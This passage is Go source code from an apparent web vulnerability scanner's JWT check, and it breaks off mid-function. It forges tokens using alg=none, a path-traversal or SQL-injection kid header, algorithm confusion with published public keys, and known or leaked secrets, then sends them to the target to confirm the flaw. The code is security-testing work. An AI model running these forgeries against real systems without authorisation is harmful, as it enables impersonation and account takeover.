package active

import (
	"bytes"
	"context"
	"crypto/hmac"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"math/big"
	"strings"
	"time"

	"github.com/guaidao2/crackweb/internal/checks"
	"github.com/guaidao2/crackweb/internal/finding"
	"github.com/guaidao2/crackweb/internal/httpmsg"
	"github.com/guaidao2/crackweb/internal/i18n"
	"github.com/guaidao2/crackweb/internal/local"
)

// jwtLocations are the request fields a token is carried in.
var jwtLocations = []string{"Authorization", "Cookie", "X-Auth-Token", "X-Access-Token", "X-Authorization"}

// algNoneSpellings are the ways a token can claim it needs no signature. Some
// libraries compare the algorithm case-sensitively and accept only one of them,
// so all three are tried.
var algNoneSpellings = []string{"none", "None", "NONE", "nOnE"}

// jwt detects a JSON Web Token the application accepts without verifying it.
//
// The test is the algorithm-confusion family's simplest member: take the token
// the application issued, strip its signature, and relabel the algorithm as
// "none". A verifier that trusts the token's own header will accept it, and
// anyone can then mint a token for any user.
//
// It is request-level because the token lives in a header, and because the
// experiment is about the request as a whole — replacing the credential and
// seeing whether the same request still succeeds.
type jwt struct{}

func (jwt) ID() string                 { return "jwt" }
func (jwt) TitleKey() i18n.Key         { return i18n.KeyCheckJWTTitle }
func (jwt) DescriptionKey() i18n.Key   { return i18n.KeyCheckJWTDesc }
func (jwt) RemediationKey() i18n.Key   { return i18n.KeyCheckJWTFix }
func (jwt) Severity() finding.Severity { return finding.SeverityCritical }
func (jwt) Tags() []string {
	return []string{"active", "authentication", "jwt", "owasp-top10"}
}
func (jwt) Passive() bool { return false }

// IsRequestLevel marks this as a check that rewrites a credential in place.
func (jwt) IsRequestLevel() bool { return true }

func (jwt) Run(ctx context.Context, c *checks.Context, t *checks.Target) []*finding.Finding {
	if t == nil || t.Request == nil || t.Response == nil {
		return nil
	}
	// A request that already failed gives no baseline: an unchanged rejection
	// after forgery would prove nothing either way.
	if t.Response.Status >= 400 {
		return nil
	}

	field, original := findJWT(t.Request)
	if original == "" {
		return nil
	}
	parts := strings.Split(original, ".")
	if len(parts) != 3 {
		return nil
	}
	// The header has to be readable, or there is nothing to rewrite.
	header, err := decodeJWTPart(parts[0])
	if err != nil {
		return nil
	}

	for _, spelling := range algNoneSpellings {
		forgedHeader := map[string]any{}
		for k, v := range header {
			forgedHeader[k] = v
		}
		forgedHeader["alg"] = spelling
		// A token that needs no signature is sent with an empty one.
		forged := encodeJWTPart(forgedHeader) + "." + parts[1] + "."

		mutated := t.Request.Clone()
		mutated.Header.Set(field, replaceToken(t.Request.Header.Get(field), original, forged))
		response, err := c.Do(ctx, mutated)
		if err != nil || response == nil {
			continue
		}
		// The same request succeeded with a token nobody signed: the application
		// is not verifying, and the credential means nothing.
		if !jwtAccepted(response, t.Response) {
			continue
		}

		// Before that conclusion stands, the endpoint has to need a credential at all. An
		// endpoint that never looks at the header answers 200 to everything, which is exactly
		// what accepting an unsigned token looks like from the outside — and reporting it
		// would call every page that ignores Authorization a broken JWT implementation. Ask
		// once without the credential: if that succeeds too, the token proved nothing.
		// Sent with the credential taken off and no configured credential put back: a control
		// that carries the identity cannot show that the identity is required.
		uncredentialed := t.Request.Clone()
		uncredentialed.Header.Del(field)
		freeResponse, err := c.DoWithoutCredentials(ctx, uncredentialed)
		if err == nil && freeResponse != nil && jwtAccepted(freeResponse, t.Response) {
			continue
		}

		f := checks.NewFinding(jwt{}, t,
			i18n.KeyCheckJWTTitle, i18n.KeyCheckJWTDesc, i18n.KeyCheckJWTFix)
		f.Severity = finding.SeverityCritical
		f.Confidence = finding.ConfidenceCertain
		// Whether a token's signature is checked is a property of the deployment, not of the
		// endpoint: a crawl that walks twenty pages reports the same misconfiguration twenty
		// times and buries everything else. The key is the authority, so two applications on
		// one host but different ports stay separate findings.
		f.DedupHostOnly = true
		f.Method = mutated.Method
		f.URL = mutated.URLString()
		f.Payload = forged
		f.CWE = "CWE-347"
		f.References = []string{
			"https://portswigger.net/web-security/jwt",
			"https://cwe.mitre.org/data/definitions/347.html",
		}
		f.Evidence.Request = mutated.Raw()
		f.Evidence.Response = truncate(response.Body, 8192)
		f.Evidence.Baseline = truncate(t.Response.Body, 4096)
		f.Evidence.Matches = []string{
			field + ": alg=" + spelling + " with an empty signature was accepted",
		}
		return []*finding.Finding{f}
	}

	// A token that is verified can still be forged through the field that names
	// its key — see kidInjection.
	if f := (jwt{}).kidInjection(ctx, c, t, field, original, parts, header); f != nil {
		return []*finding.Finding{f}
	}
	// A token signed asymmetrically can also be forged with the public half of its own
	// key — see jwtAlgorithmConfusion.
	if f := jwtAlgorithmConfusion(ctx, c, t, field, original, parts, header); f != nil {
		return []*finding.Finding{f}
	}
	// A key the operator already holds, which is the offline discovery cashed in: a secret
	// that signs a token the service accepts makes every identity forgeable, and that is a
	// conclusion about the service rather than about arithmetic.
	if f := jwtKnownSecret(ctx, c, t, field, original, parts, header); f != nil {
		return []*finding.Finding{f}
	}
	// A verifier that refuses a token and then answers the refusal with the key it refused it
	// under — see jwtLeakedSigningKey. Placed after the forgeries above because it is the answer
	// to a different question: not "is the signature checked" but "does the check keep its key
	// to itself", and that one still matters on a service whose verifier is otherwise sound.
	if f := jwtLeakedSigningKey(ctx, c, t, field, original, parts, header); f != nil {
		return []*finding.Finding{f}
	}
	// Last, because it needs an interaction server and proves a different thing: the
	// verifier follows an address the token supplies.
	if f := jwtKeyURL(ctx, c, t, field, original, parts, header); f != nil {
		return []*finding.Finding{f}
	}
	return nil
}

// jwtKnownSecret tries keys the operator supplied as the secret behind the token in hand.
//
// This is where an offline finding becomes an online one. Recovering a secret from a token
// proves the token was signed with it; it does not prove the service still uses it, and a
// rotated or leaked-but-abandoned key is not a vulnerability. Signing the very token the
// service accepted and offering it back settles that — nothing about the request changes
// except the signature, so a service that takes it has just been told an identity it may not
// have meant to issue.
func jwtKnownSecret(ctx context.Context, c *checks.Context, t *checks.Target, field, original string, parts []string, header map[string]any) *finding.Finding {
	if len(c.JWTSecrets) == 0 {
		return nil
	}
	// Only a keyed-hash signature can be reproduced from a secret; an asymmetric one cannot.
	if !local.SymmetricAlgorithm(headerAlgorithm(header)) {
		return nil
	}

	claims, err := decodeJWTPart(parts[1])
	if err != nil {
		return nil
	}

	for _, secret := range c.JWTSecrets {
		forged := local.SignWith(headerAlgorithm(header), parts[0]+"."+parts[1], []byte(secret))
		if forged == original {
			// The key supplied is the one already behind this token, and the service just
			// accepted a token it signed. That is the strongest form of the finding rather
			// than a reason to skip it: the exchange is proof, and a second request cannot
			// add anything to it.
			f := checks.NewFinding(jwt{}, t, i18n.KeyCheckJWTWeakSecretTitle, i18n.KeyCheckJWTWeakSecretDesc, i18n.KeyCheckJWTFix)
			f.Param = field
			f.Payload = secret
			f.Severity = finding.SeverityCritical
			f.Confidence = finding.ConfidenceCertain
			f.DedupHostOnly = true
			f.Evidence.Matches = []string{original}
			f.Evidence.Diff = c.Bundle.T(i18n.KeyEvidenceJWTWeakSecretSameKey, secret)
			return f
		}

		// Ask with the token signed under the known key. Nothing else about the request
		// changes, so an acceptance is about the signature.
		mutated := t.Request.Clone()
		mutated.Header.Set(field, replaceToken(t.Request.Header.Get(field), original, forged))
		response, err := c.Do(ctx, mutated)
		if err != nil || response == nil || !jwtAccepted(response, t.Response) {
			continue
		}

		// The control this check uses everywhere: an endpoint that never looks at the
		// credential answers to anything, and that weakness — if it is one — is what the
		// alg=none attempts above report. It has to reach the server without an identity, so
		// it goes through the anonymous path: deleting the header and calling Do lets the
		// client's configured credential be restored, and a control that authenticates
		// always succeeds.
		control := t.Request.Clone()
		control.Header.Del(field)
		if unauthenticated, err := c.DoWithoutCredentials(ctx, control); err == nil && unauthenticated != nil && jwtAccepted(unauthenticated, t.Response) {
			continue
		}

		// A signature that is simply wrong must be refused, or the acceptance was about
		// something other than the key.
		wrong := local.SignWith(headerAlgorithm(header), parts[0]+"."+parts[1], []byte(secret+"x"))
		sanity := t.Request.Clone()
		sanity.Header.Set(field, replaceToken(t.Request.Header.Get(field), original, wrong))
		if mistaken, err := c.Do(ctx, sanity); err == nil && mistaken != nil && jwtAccepted(mistaken, t.Response) {
			continue
		}

		f := checks.NewFinding(jwt{}, t, i18n.KeyCheckJWTWeakSecretTitle, i18n.KeyCheckJWTWeakSecretDesc, i18n.KeyCheckJWTFix)
		f.Param = field
		f.Payload = secret
		f.Severity = finding.SeverityCritical
		f.Confidence = finding.ConfidenceCertain
		f.DedupHostOnly = true
		f.Evidence.Matches = []string{original, forged}
		f.Evidence.Diff = c.Bundle.T(i18n.KeyEvidenceJWTWeakSecretReSigned, secret)
		_ = claims
		return f
	}
	return nil
}

// jwtLeakedKeyMinLength is the shortest value treated as key material. Below it a word from the
// message is a word: "none", "null", "true" and "key" all fit under it.
const jwtLeakedKeyMinLength = 6

// jwtLeakedKeyMaxLength bounds what one value is read as. A signing key longer than this is not a
// key but a document, and a published document is the passive checks' finding.
const jwtLeakedKeyMaxLength = 256

// jwtLeakedKeyScanLimit bounds the part of a refusal that is searched. A stack trace runs to
// megabytes and nothing about this finding lives past the first screen of it.
const jwtLeakedKeyScanLimit = 64 * 1024

// jwtLeakedKeyMaxCandidates bounds how many values from one refusal are tried as a key.
const jwtLeakedKeyMaxCandidates = 400

// jwtLeakedSigningKey reports a service that discloses the key its tokens are signed with in the
// error it returns for a token it refuses.
//
// The exchange is the ordinary one: a token whose signature is wrong is sent, and what the
// verifier says about it is read. Two kinds of material are reported, and a word from an error
// message is neither of them:
//
//   - material that reproduces the signature of the token in hand. A string in a 401 whose keyed
//     hash is the signature the service accepted is the key, whatever the sentence around it
//     claims, and no page arrives at that by accident.
//   - material the message names as the key its tokens are signed with — `"signing_key": "…"`
//     and its spellings. Nothing verifies that value (a rotated key would not), so the finding
//     repeats what the message said instead of asserting more.
//
// Three controls keep the noise out, and each of them removes a way this could be wrong rather
// than a way it could fire:
//
//   - the response has to be a refusal. An answer the service would also have given the token it
//     issued says nothing about this token, and a target that never looks at the credential is
//     reported by the alg=none attempts above.
//   - the material has to be new. What the accepted answer already printed is a page that
//     publishes its key, and calling that a leak by the refusal would put the wrong sentence in
//     the report. Both sides of the comparison get the same treatment.
//   - the material must not be the request's own bytes. A page that quotes the token it was
//     handed contains the marker without the service having said anything it should not have.
//
// Only a keyed-hash token is examined. Its key is a string a message can be *proved* to have
// disclosed, because the signature is a function of it. An asymmetric key in a message would be
// all message and no proof — a key identifier is not key material — and a published private key,
// which is what such a leak actually looks like, is what the passive private-key check reports.
func jwtLeakedSigningKey(ctx context.Context, c *checks.Context, t *checks.Target, field, original string, parts []string, header map[string]any) *finding.Finding {
	if !local.SymmetricAlgorithm(headerAlgorithm(header)) {
		return nil
	}
	token, err := local.Parse(original)
	if err != nil || !token.Signed() {
		return nil
	}

	// The token the verifier must refuse, altered in the bytes of its signature rather than in
	// its text: see tamperSignature for why the text alone is not enough to make a forgery.
	forged := parts[0] + "." + parts[1] + "." + tamperSignature(parts[2])
	probe := t.Request.Clone()
	probe.Header.Set(field, replaceToken(t.Request.Header.Get(field), original, forged))
	response, err := c.Do(ctx, probe)
	if err != nil || response == nil {
		return nil
	}
	if jwtAccepted(response, t.Response) {
		return nil
	}

	key, label, verified := jwtDisclosedKey(
		string(truncate(response.Body, jwtLeakedKeyScanLimit)),
		token,
		t.Response.Body,
		probe.Raw(),
		original,
	)
	if key == "" {
		return nil
	}
	// A label alone does not prove that the value is the key behind this token: a refusal can
	// name a signing key without disclosing usable material. Only the verified path is reported.
	if !verified {
		return nil
	}

	f := checks.NewFinding(jwt{}, t,
		i18n.KeyCheckJWTWeakSecretTitle, i18n.KeyCheckJWTWeakSecretDesc, i18n.KeyCheckJWTFix)
	f.Param = field
	f.Method = probe.Method
	f.URL = probe.URLString()
	// What a reader replays is the token that earned the refusal: the key comes back with it.
	f.Payload = forged
	f.CWE = "CWE-209"
	f.References = []string{
		"https://cwe.mitre.org/data/definitions/209.html",
		"https://portswigger.net/web-security/jwt",
	}
	// The key belongs to the deployment, not to the endpoint: a crawl that walks twenty pages
	// would otherwise report the same disclosure twenty times.
	f.DedupHostOnly = true
	f.Evidence.Request = probe.Raw()
	f.Evidence.Response = truncate(response.Body, 8192)
	f.Evidence.Baseline = truncate(t.Response.Body, 4096)

	if verified {
		// The token the service accepted is signed with this key, and the refusal handed it out:
		// every identity the application recognises is forgeable by whoever read that error.
		f.Severity = finding.SeverityCritical
		f.Confidence = finding.ConfidenceCertain
		f.Evidence.Diff = c.Bundle.T(i18n.KeyEvidenceJWTWeakSecretSameKey, key)
		f.Evidence.Matches = []string{
			key,
			"the value was returned in the refusal to a token whose signature was altered, and it " +
				"reproduces the signature of the token the service accepted",
		}
		return f
	}

	// Nothing proves this value is the key behind this token, so the finding says what the
	// message said and no more than that.
	f.Severity = finding.SeverityHigh
	f.Confidence = finding.ConfidenceFirm
	f.Evidence.Diff = "the refusal named " + label + " with the value " + key +
		"; a signing key printed in an error is a key the service can no longer keep"
	f.Evidence.Matches = []string{label, key}
	return f
}

// jwtDisclosedKey returns the key a refusal disclosed: the value, the name the message used for
// it when there was one, and whether the value was proved to be the key behind the token.
//
// The decisive form is tried over every value-shaped run of the message before the labelled form
// is considered, so a service that both prints its key and names it is reported as proved rather
// than as claimed.
func jwtDisclosedKey(body string, token *local.Token, baseline, request []byte, original string) (key, label string, verified bool) {
	// disclosed reports whether a value is the refusal's own disclosure rather than something the
	// exchange already contained.
	disclosed := func(value string) bool {
		if len(value) < jwtLeakedKeyMinLength || len(value) > jwtLeakedKeyMaxLength {
			return false
		}
		// The request's own bytes and the token's own bytes are echo, not disclosure.
		if bytes.Contains(request, []byte(value)) || strings.Contains(original, value) {
			return false
		}
		// What the accepted answer already printed is a page that publishes the key.
		return !bytes.Contains(baseline, []byte(value))
	}

	for _, run := range jwtKeyRuns(body, jwtLeakedKeyMaxCandidates) {
		for _, candidate := range jwtKeySpellings(run) {
			if !disclosed(candidate) {
				continue
			}
			if token.VerifyHMAC([]byte(candidate)) {
				return candidate, "", true
			}
		}
	}

	for _, mention := range jwtKeyMentions(body) {
		if !disclosed(mention.value) || jwtNotKeyMaterial[jwtNormaliseLabel(mention.value)] {
			continue
		}
		if token.VerifyHMAC([]byte(mention.value)) {
			return mention.value, mention.label, true
		}
		if key == "" {
			key, label = mention.value, mention.label
		}
	}
	return key, label, false
}

// jwtKeyRuns returns the runs of characters a printed key can consist of.
//
// The separators are the punctuation a message puts around a value — quotes, a colon, commas,
// brackets, whitespace — so `{"signing_key":"abc123"}` and `signing_key=abc123` both yield the
// value on its own, and neither yields the field name glued to it. `=` splits, and both of what
// it separates is tried: a base64 value that ends in padding loses it, and an HMAC comparison
// decides whether the spelling that was lost was the one the verifier holds.
func jwtKeyRuns(text string, limit int) []string {
	out := make([]string, 0, 16)
	start := -1
	flush := func(end int) {
		if start < 0 {
			return
		}
		if run := text[start:end]; run != "" && len(out) < limit {
			out = append(out, run)
		}
		start = -1
	}
	for index := 0; index < len(text); index++ {
		if jwtKeyByte(text[index]) {
			if start < 0 {
				start = index
			}
			continue
		}
		flush(index)
		if len(out) >= limit {
			return out
		}
	}
	flush(len(text))
	return out
}

// jwtKeySpellings returns a run as it stands and with the punctuation a sentence wraps it in
// taken off: a trailing full stop is punctuation, not part of the key.
func jwtKeySpellings(run string) []string {
	trimmed := strings.Trim(run, ".-~_")
	if trimmed == "" || trimmed == run {
		return []string{run}
	}
	return []string{run, trimmed}
}

// jwtKeyByte reports whether a byte can appear in a key as a message prints it.
func jwtKeyByte(b byte) bool {
	switch {
	case b >= 'a' && b <= 'z', b >= 'A' && b <= 'Z', b >= '0' && b <= '9':
		return true
	}
	switch b {
	case '+', '_', '-', '.', '~', '/':
		return true
	}
	return false
}

// jwtKeyMention is a value a message named as the key its tokens are signed with.
type jwtKeyMention struct {
	// label is the spelling the message used, kept for the evidence.
	label string
	// value is what the message put after it.
	value string
}

// jwtSigningKeyLabels are the names a message uses when it says which key a token is signed
// with. Every one of them names a signing key; a bare "key" or "secret" does not, and those are
// exactly the words an error message reaches for when it is talking about something else.
var jwtSigningKeyLabels = map[string]bool{
	"signingkey": true, "signingsecret": true, "signkey": true, "tokensigningkey": true,
	"jwtkey": true, "jwtsecret": true, "hmackey": true, "hmacsecret": true,
	"verifykey": true, "verificationkey": true, "verifiersecret": true,
}

// jwtNotKeyMaterial are the words a message puts where a key would go when the key is what is
// missing. Reading one as a disclosed key turns "signing_key: required" into a finding.
var jwtNotKeyMaterial = map[string]bool{
	"required": true, "missing": true, "invalid": true, "unknown": true, "absent": true,
	"none": true, "null": true, "unset": true, "notset": true, "notfound": true,
	"empty": true, "undefined": true, "default": true, "disabled": true, "enabled": true,
	"expired": true, "configured": true, "unavailable": true, "true": true, "false": true,
}

// jwtKeyMentions returns the values a message named as the signing key, each with the label that
// named it.
func jwtKeyMentions(text string) []jwtKeyMention {
	var out []jwtKeyMention
	for index := 0; index < len(text); index++ {
		if text[index] != ':' && text[index] != '=' {
			continue
		}
		label, ok := jwtLabelBefore(text, index)
		if !ok {
			continue
		}
		value, ok := jwtValueAfter(text, index+1)
		if !ok {
			continue
		}
		out = append(out, jwtKeyMention{label: label, value: value})
	}
	return out
}

// jwtLabelBefore returns the label a separator ends, when it names a signing key. Prose spells
// the same name in two words — "signing key: …", "jwt secret: …" — so the word before the
// separator is joined to the one before it when that pair is a spelling the map carries. Neither
// word on its own has to be one, which is what keeps "the key: …" out.
func jwtLabelBefore(text string, end int) (string, bool) {
	word, start := jwtWordBefore(text, end)
	if word == "" {
		return "", false
	}
	if jwtSigningKeyLabels[jwtNormaliseLabel(word)] {
		return word, true
	}
	previous, _ := jwtWordBefore(text, start)
	if previous == "" {
		return "", false
	}
	if jwtSigningKeyLabels[jwtNormaliseLabel(previous+word)] {
		return previous + " " + word, true
	}
	return "", false
}

// jwtWordBefore returns the word that ends at end, and the offset to continue searching from.
//
// The whitespace and quotes between a label and its separator are punctuation: `"signing_key":`
// and `signing key :` both end with the label itself.
func jwtWordBefore(text string, end int) (string, int) {
	index := end
	for index > 0 && (jwtLabelSpace(text[index-1]) || jwtLabelQuote(text[index-1])) {
		index--
	}
	start := index
	for start > 0 && jwtLabelByte(text[start-1]) {
		start--
	}
	return text[start:index], start
}

// jwtValueAfter returns the value that follows a separator: a quoted string when the message
// quotes it, and otherwise the run of key characters it starts with.
func jwtValueAfter(text string, start int) (string, bool) {
	for start < len(text) && jwtLabelSpace(text[start]) {
		start++
	}
	if start >= len(text) {
		return "", false
	}
	if quote := text[start]; jwtLabelQuote(quote) {
		end := strings.IndexByte(text[start+1:], quote)
		if end < 0 || end > jwtLeakedKeyMaxLength {
			return "", false
		}
		return text[start+1 : start+1+end], true
	}
	end := start
	for end < len(text) && jwtKeyByte(text[end]) {
		end++
	}
	if end == start {
		return "", false
	}
	return text[start:end], true
}

// jwtNormaliseLabel folds the spellings of a label into one: `signing_key`, `signing-key`,
// `signingKey` and `signing key` all name the same thing.
func jwtNormaliseLabel(label string) string {
	lowered := strings.ToLower(label)
	var folded strings.Builder
	for index := 0; index < len(lowered); index++ {
		switch lowered[index] {
		case '_', '-', ' ', '.', '\t':
			continue
		}
		folded.WriteByte(lowered[index])
	}
	return folded.String()
}

// jwtLabelByte reports whether a byte can be part of a label.
func jwtLabelByte(b byte) bool {
	switch {
	case b >= 'a' && b <= 'z', b >= 'A' && b <= 'Z', b >= '0' && b <= '9':
		return true
	}
	return b == '_' || b == '-' || b == '.'
}

// jwtLabelSpace reports whether a byte is whitespace a message separates a label with.
func jwtLabelSpace(b byte) bool {
	return b == ' ' || b == '\t' || b == '\n' || b == '\r'
}

// jwtLabelQuote reports whether a byte quotes a value.
func jwtLabelQuote(b byte) bool {
	return b == '"' || b == '\'' || b == '`'
}

// headerAlgorithm reads the "alg" a header declares.
func headerAlgorithm(header map[string]any) string {
	if value, ok := header["alg"].(string); ok {
		return value
	}
	return ""
}

// kidForgerySpellings are key identifiers that make a verifier read a key the
// caller chooses. The identifier is not authenticated before it is used, so it
// reaches a file open or a query — and both of those answer with something the
// caller can predict.
var kidForgerySpellings = []struct {
	kid  string
	key  []byte
	note string
}{
	{"../../../../../../dev/null", nil,
		"the identifier resolves to an empty file, so an empty key signs the token"},
	{"/dev/null", nil,
		"the null device, which is always empty"},
	{"' UNION SELECT 'crackweb-kid-secret'-- -", []byte("crackweb-kid-secret"),
		"the identifier is concatenated into a query that returns the key it names"},
}

// tamperSignature changes one character of a signature, which is enough to make
// it invalid under any correct verifier.
// tamperSignature returns a signature that differs from the one given, changed in the bytes
// rather than in the text.
//
// Changing a character of the base64 is not enough. The last character of a signature carries
// two padding bits, so replacing a final `A` with `B` decodes to the very same bytes: the
// "forged" token is a valid one, the verifier accepts it, and a check that reads that as
// "signatures are not verified" gives up on the target it was about to test. The first character
// of the encoding carries six significant bits, and the bytes themselves always can be changed.
func tamperSignature(signature string) string {
	if signature == "" {
		return "AAAA"
	}
	raw, err := base64.RawURLEncoding.DecodeString(signature)
	if err != nil || len(raw) == 0 {
		// Not a signature this can decode — change the first character, which never sits on a
		// padding bit, so the text differs and so does what it stands for.
		if signature[0] == 'A' {
			return "B" + signature[1:]
		}
		return "A" + signature[1:]
	}
	forged := make([]byte, len(raw))
	copy(forged, raw)
	forged[0] ^= 0x01
	return base64.RawURLEncoding.EncodeToString(forged)
}

// jwtAccepted reports whether the application treated the request the same way it treated the
// one whose credential it issued.
//
// The comparison is with the accepted baseline, not with a list of words that look like
// rejection. That list was wrong, and wrong in the way that hides a real vulnerability: a
// service whose data happens to contain "invalid" — a test account's address,
// `someone@invalid.local` — answered a forged token exactly as it answered a good one, and the
// word made the check call it a rejection. Data is not a verdict.
//
// What a rejection actually looks like is a different answer: a 401, or a body of a different
// size and shape. Both are visible against the baseline without reading any meaning into it.
func jwtAccepted(response, baseline *httpmsg.Response) bool {
	if response == nil || response.Status >= 400 {
		return false
	}
	if baseline == nil || baseline.Status >= 400 {
		// Nothing to compare against; the status is all there is.
		return true
	}
	if response.Status != baseline.Status {
		return false
	}
	// An answer of a very different size is a different answer. A rejection is usually a short
	// error object where the accepted response was a page or a result set.
	accepted, answer := len(baseline.Body), len(response.Body)
	if accepted == 0 {
		return answer == 0
	}
	ratio := float64(answer) / float64(accepted)
	return ratio >= 0.5 && ratio <= 2.0
}

// signJWT builds a token from a header and a payload, signed with HMAC-SHA256.
func signJWT(header, payload map[string]any, key []byte) string {
	signingInput := encodeJWTPart(header) + "." + encodeJWTPart(payload)
	mac := hmac.New(sha256.New, key)
	mac.Write([]byte(signingInput))
	return signingInput + "." + base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
}

// kidInjection forges a token whose key identifier points at a key the caller
// chose, and reports it when the application accepts the result.
//
// The guard matters as much as the attempt: a forged token proves nothing unless
// the verifier rejects a signature that is simply wrong. Without that control, an
// application which never checks signatures would look like one with a broken key
// lookup — and that weakness is already reported, by the alg=none attempts above.
func (jwt) kidInjection(ctx context.Context, c *checks.Context, t *checks.Target, field, original string, parts []string, header map[string]any) *finding.Finding {
	payload, err := decodeJWTPart(parts[1])
	if err != nil {
		return nil
	}
	mutate := func(token string) (*httpmsg.Request, *httpmsg.Response) {
		mutated := t.Request.Clone()
		mutated.Header.Set(field, replaceToken(t.Request.Header.Get(field), original, token))
		response, err := c.Do(ctx, mutated)
		if err != nil {
			return mutated, nil
		}
		return mutated, response
	}

	if _, control := mutate(parts[0] + "." + parts[1] + "." + tamperSignature(parts[2])); jwtAccepted(control, t.Response) {
		return nil
	}

	for _, spelling := range kidForgerySpellings {
		forgedHeader := map[string]any{}
		for k, v := range header {
			forgedHeader[k] = v
		}
		forgedHeader["kid"] = spelling.kid
		forged := signJWT(forgedHeader, payload, spelling.key)

		mutated, response := mutate(forged)
		if !jwtAccepted(response, t.Response) {
			continue
		}
		f := checks.NewFinding(jwt{}, t,
			i18n.KeyCheckJWTKidTitle, i18n.KeyCheckJWTKidDesc, i18n.KeyCheckJWTFix)
		f.Severity = finding.SeverityCritical
		f.Confidence = finding.ConfidenceCertain
		f.Method = mutated.Method
		f.URL = mutated.URLString()
		f.Payload = forged
		f.CWE = "CWE-347"
		f.References = []string{
			"https://portswigger.net/web-security/jwt",
			"https://cwe.mitre.org/data/definitions/347.html",
		}
		f.Evidence.Request = mutated.Raw()
		f.Evidence.Response = truncate(response.Body, 8192)
		f.Evidence.Baseline = truncate(t.Response.Body, 4096)
		f.Evidence.Matches = []string{
			field + ": kid=" + spelling.kid + " was accepted — " + spelling.note,
			"a signature that is merely wrong was rejected, so the verifier does check signatures",
		}
		return f
	}
	return nil
}

// replaceToken returns a request header value with its token replaced and
// everything else left alone — `Bearer ` above all.
//
// Rebuilding the value from the token alone drops the scheme, and a header the
// server cannot parse is not a test of anything: such a request is refused for
// its shape rather than for its signature, so every forgery would look rejected,
// and the finding would silently never appear on the targets that use a scheme.
func replaceToken(headerValue, original, forged string) string {
	if index := strings.Index(headerValue, original); index >= 0 {
		return headerValue[:index] + forged + headerValue[index+len(original):]
	}
	return forged
}

// jwtPublicKeyPaths are where a service that signs with a private key publishes the
// matching public key. They are guesses, which is why the check tries several and is silent
// when none answers.
var jwtPublicKeyPaths = []string{
	"/.well-known/jwks.json",
	"/jwks.json",
	"/.well-known/jwks",
	"/jwt/jwks.json",
	"/oauth/jwks.json",
	"/publickey.pem",
}

// asymmetricAlgorithms are the JWT algorithms that sign with a private key and verify with a
// public one — the family the confusion attack applies to.
var asymmetricAlgorithms = map[string]bool{
	"rs256": true, "rs384": true, "rs512": true,
	"ps256": true, "ps384": true, "ps512": true,
	"es256": true, "es384": true, "es512": true,
}

// jwtAlgorithmConfusion reports a service that verifies a token with the public key it
// published.
//
// The attack is a substitution: the application signs asymmetrically, the verifier is asked
// to check a token that claims HS256, and the key it reaches for is the public key the
// service itself hands out. To the verifier the bytes are just bytes, so a token anyone can
// forge is accepted as genuine. It is conclusive when it works — the forged token is signed
// with a key the caller was given — and it needs the public key, which is why the check
// looks for it where services publish it.
func jwtAlgorithmConfusion(ctx context.Context, c *checks.Context, t *checks.Target, field, original string, parts []string, header map[string]any) *finding.Finding {
	algorithm, _ := header["alg"].(string)
	if !asymmetricAlgorithms[strings.ToLower(algorithm)] {
		return nil
	}
	payload, err := decodeJWTPart(parts[1])
	if err != nil {
		return nil
	}

	// The same control the kid probe uses: a signature that is merely wrong has to be
	// refused, or nothing was defeated and the header is simply not checked.
	mutate := func(token string) (*httpmsg.Request, *httpmsg.Response) {
		mutated := t.Request.Clone()
		mutated.Header.Set(field, replaceToken(t.Request.Header.Get(field), original, token))
		response, err := c.Do(ctx, mutated)
		if err != nil {
			return mutated, nil
		}
		return mutated, response
	}
	if _, control := mutate(parts[0] + "." + parts[1] + "." + tamperSignature(parts[2])); jwtAccepted(control, t.Response) {
		return nil
	}

	for _, path := range jwtPublicKeyPaths {
		published, err := fetchPath(ctx, c, t, path)
		if err != nil || published == nil || published.Status != 200 {
			continue
		}
		for _, key := range publishedPublicKeys(published.Body) {
			forgedHeader := map[string]any{}
			for k, v := range header {
				forgedHeader[k] = v
			}
			forgedHeader["alg"] = "HS256"
			forged := signJWT(forgedHeader, payload, key)

			mutated, response := mutate(forged)
			if !jwtAccepted(response, t.Response) {
				continue
			}

			f := checks.NewFinding(jwt{}, t,
				i18n.KeyCheckJWTConfusionTitle, i18n.KeyCheckJWTConfusionDesc, i18n.KeyCheckJWTFix)
			f.Severity = finding.SeverityCritical
			f.Confidence = finding.ConfidenceCertain
			f.Method = mutated.Method
			f.URL = mutated.URLString()
			f.Payload = forged
			f.CWE = "CWE-347"
			f.References = []string{
				"https://portswigger.net/web-security/jwt/algorithm-confusion",
				"https://cwe.mitre.org/data/definitions/347.html",
			}
			f.Evidence.Request = mutated.Raw()
			f.Evidence.Response = truncate(response.Body, 8192)
			f.Evidence.Baseline = truncate(t.Response.Body, 4096)
			f.Evidence.Matches = []string{
				"the token was signed with the " + algorithm + "-family key the service publishes at " +
					path + ", relabelled HS256, and it was accepted",
				"the verifier uses the public key as an HMAC secret, so anyone who can read the " +
					"public key can mint a token",
			}
			return f
		}
	}
	return nil
}

// publishedPublicKeys returns the PEM blobs a key document carries: a JWKS converts its
// numbers back into a key, and a document that simply holds PEM is used as it stands. Both
// spellings are keys a verifier might have reached for.
func publishedPublicKeys(body []byte) [][]byte {
	var out [][]byte
	trimmed := bytes.TrimSpace(body)

	// A PEM document, with or without JSON around it.
	if bytes.Contains(trimmed, []byte("-----BEGIN")) {
		if start := bytes.Index(trimmed, []byte("-----BEGIN")); start >= 0 {
			if end := bytes.Index(trimmed[start:], []byte("-----END")); end > 0 {
				block := trimmed[start : start+end]
				if marker := bytes.Index(block, []byte("-----\n")); marker > 0 {
					end = marker + len("-----\n")
				}
				out = append(out, bytes.TrimSpace(block[:end+3]))
			}
		}
	}

	// A JWKS: each key becomes a PEM blob whose bytes are what a naive verifier would use.
	var document struct {
		Keys []struct {
			Kty string `json:"kty"`
			N   string `json:"n"`
			E   string `json:"e"`
		} `json:"keys"`
		PEM string `json:"pem"`
	}
	if err := json.Unmarshal(trimmed, &document); err == nil {
		if document.PEM != "" {
			out = append(out, []byte(document.PEM))
		}
		for _, key := range document.Keys {
			if !strings.EqualFold(key.Kty, "RSA") || key.N == "" || key.E == "" {
				continue
			}
			modulus, err := base64.RawURLEncoding.DecodeString(key.N)
			if err != nil {
				continue
			}
			exponent, err := base64.RawURLEncoding.DecodeString(key.E)
			if err != nil {
				continue
			}
			number := 0
			for _, b := range exponent {
				number = number<<8 | int(b)
			}
			published := rsa.PublicKey{N: new(big.Int).SetBytes(modulus), E: number}
			derived, err := x509.MarshalPKIXPublicKey(&published)
			if err != nil {
				continue
			}
